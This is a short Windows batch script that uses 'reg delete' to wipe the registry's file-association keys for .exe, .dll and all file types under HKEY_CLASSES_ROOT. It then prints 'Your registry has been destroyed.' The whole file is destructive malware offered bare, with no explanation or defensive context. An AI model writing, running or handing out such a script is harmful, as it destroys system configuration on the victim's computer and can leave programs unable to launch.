@echo off
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
echo Your registry has been destroyed.
